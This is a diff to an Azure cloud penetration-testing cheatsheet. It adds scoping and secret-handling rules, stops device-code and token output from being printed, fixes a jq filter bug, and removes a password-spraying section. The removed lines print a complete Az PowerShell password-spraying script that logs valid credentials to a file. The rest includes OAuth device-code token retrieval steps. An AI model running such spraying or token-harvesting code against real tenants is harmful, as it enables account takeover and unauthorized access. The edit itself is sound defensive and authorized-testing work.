@@ -2,6 +2,10 @@
 
 Reference: [Cloud Pentesting Cheatsheet by Beau Bullock](https://github.com/dafthack/CloudPentestCheatsheets)
 
+## Scope and handling
+
+The all-subscription loops below are templates, not permission to broaden the engagement. Replace discovery with an explicit authorized subscription/resource allowlist and private output directory. Runbooks, job output, function settings and ScoutSuite exports may contain secrets; redact before reporting. Service-principal resets, new users and role assignments can break access or create persistence: document a path without executing it unless a separate lab mutation plan and cleanup are approved. Old module/API/JSON schemas must be checked before use.
+
 ## Azure Automation Runbooks
 
 ### Export All Runbooks from All Subscriptions
@@ -91,7 +95,7 @@ $authResponse = Invoke-RestMethod `
     -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
     -Headers $Headers `
     -Body $body
-$authResponse
+# Present a device code only to the authorized authenticating user; never relay third-party codes.
 ```
 
 Navigate to https://microsoft.com/devicelogin and enter the code.
@@ -110,7 +114,7 @@ $Tokens = Invoke-RestMethod `
     -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
     -Headers $Headers `
     -Body $body
-$Tokens
+ # Do not print access/refresh tokens.
 ```
 
 ## Azure Managed Identity Token Retrieval
@@ -236,40 +240,12 @@ tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachi
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'
 
 # List Disks Encrypted with Platform Managed Keys
-tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
+tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type == "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
 ```
 
-## Password Spraying with Az PowerShell
+## Password-policy testing
 
-```powershell
-$userlist = Get-Content userlist.txt
-$passlist = Get-Content passlist.txt
-$linenumber = 0
-$count = $userlist.count
-foreach($line in $userlist){
-    $user = $line
-    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
-    $current = $linenumber + 1
-    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
-    $linenumber++
-    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
-    try {
-        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
-        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
-    }
-    catch {
-        $Failure = $_.Exception
-        if ($Failure -match "ID3242") { continue }
-        else {
-            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt $Failure.Message
-            Write-Host -ForegroundColor red $Failure.Message
-        }
-    }
-}
-```
+Use designated test identities, explicit lockout/rate budgets and an approved test plan. Do not rotate proxy IPs or credentials to evade protections. Do not log attempted passwords or store successful credentials in a report. Authentication errors are not evidence of successful login; record only verified outcomes and stop on lockout or ambiguous state.
 
 ## Service Principal Attack Path
 
